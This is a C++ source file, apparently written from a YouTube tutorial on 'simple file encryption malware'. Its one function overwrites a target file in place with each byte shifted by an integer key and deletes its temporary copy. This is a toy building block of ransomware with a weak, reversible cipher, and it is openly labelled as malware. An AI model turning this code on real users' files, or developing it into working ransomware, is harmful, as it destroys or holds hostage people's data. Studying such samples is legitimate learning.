/*
This function is based on this video: https://youtu.be/DOIcAVIUbdk

Channel name: Glotravi
Video Title: How To Create A Simple File Encryption Malware Using C/C++
*/

#include <iostream>
#include <fstream>
#include <include/colors.hpp>
using namespace std;

void encrypt(string inFile, int key) {
    //file is the file that is to be encrypted
    //tempFile is a temporary file that will hold the encrypted data that will be written to the origional file
    fstream file, tempFile;
    string tempFilePath = "temp.txt";

    //Open the file streams
    //Open inFile to read and open the tempFile to write
    file.open(inFile, ios::in | ios::binary);
    tempFile.open(tempFilePath, ios::out | ios::binary);
    cout << BOLDRED << "inFile and working file have been opened!" << RESET << endl;

    //Read the file byte by byte
    cout << RED << "Writing encrypted data to the working file..." << RESET << endl;
    char byte;
    while(file >> noskipws >> byte) {
        //Encrypte the byte by adding the key to it
        byte += key;

        //Save the encrypted byte to tempFile
        tempFile << byte;

    }

    //Close the file streams
    file.close();
    tempFile.close();
    cout << BOLDYELLOW << "inFile and working file have been closed!" << RESET << endl;

    //Re-open the file streams, but instead we write the encrypted contents of tempFile to the origional file
    file.open(inFile, ios::out | ios::binary);
    tempFile.open(tempFilePath, ios::in | ios::binary);
    cout << YELLOW << "Writing encrypted data back to the inFile..." << RESET << endl;

    //Read tempFile byte by byte
    while(tempFile >> noskipws >> byte) {
        //Save the byte into inFile
        file << byte;
    }

    //Close the file streams
    file.close();
    tempFile.close();

    //Delete the temp file
    remove(tempFilePath.c_str());

    cout << GREEN << "Done!" << RESET << endl;
}
